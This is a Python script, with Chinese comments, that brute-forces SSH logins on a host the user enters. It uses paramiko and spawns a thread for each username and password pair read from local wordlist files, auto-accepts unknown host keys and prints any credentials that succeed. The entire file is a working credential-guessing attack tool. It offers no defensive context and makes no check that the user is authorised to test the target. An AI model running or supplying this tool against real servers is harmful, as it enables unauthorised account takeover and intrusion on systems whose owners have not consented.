import paramiko
import threading
import time
threads = []  # 线程池
thread_max = threading.BoundedSemaphore(1000000)


def sshbrute(user, passw, host):
    passw = str(passw)
    try:
        # 使用 paramiko.SSHClient 创建 ssh 对象
        ssh = paramiko.SSHClient()
        # 允许将信任的主机自动加入到host_allow 列表，此方法必须放在connect方法的前面，接受对方的公钥证书
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # 登录 ssh，连接失败则抛出异常跳转到except并输出匹配错误的结果
        ssh.connect(hostname=host, port=22, username=user, password=passw, timeout=1)
        # 打印出成功登录的 用户名 和 密码

        print("login success! User:" + user, "Pass:" + passw)
    except:
        print("login failed!", "user:" + user, "pass:" + passw + '\n', end='')
def multi_ssh(tempuser, temppasswd, target):  # 多线程
    userfile = tempuser.readlines()
    passwdfile = temppasswd.readlines()
    for a in userfile:
        for i in passwdfile:
            thread_max.acquire()
            t = threading.Thread(target=sshbrute, args=(a.replace('\n', ''), i.replace('\n', ''), target,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()


def begin():
    host = input(' 请输入需要ssh爆破的地址:')
    timestart=time.time()
    print("--------开始进行ssh爆破,这可能会花费一些时间,请耐心等待----------")
    tempuser = open('用户名.txt', 'r')
    temppasswd = open('密码库.txt', 'r')
    multi_ssh(tempuser, temppasswd, host)
    timeend = time.time()
    print("------------耗时{0:.5f}秒，ssh爆破功能完成------------".format(timeend - timestart))




'''对print加锁,防止输出混乱'''
_print = print
mutex = threading.Lock()
def print(text, *args, **kw):
    with mutex:
        _print(text, *args, **kw)
        
        
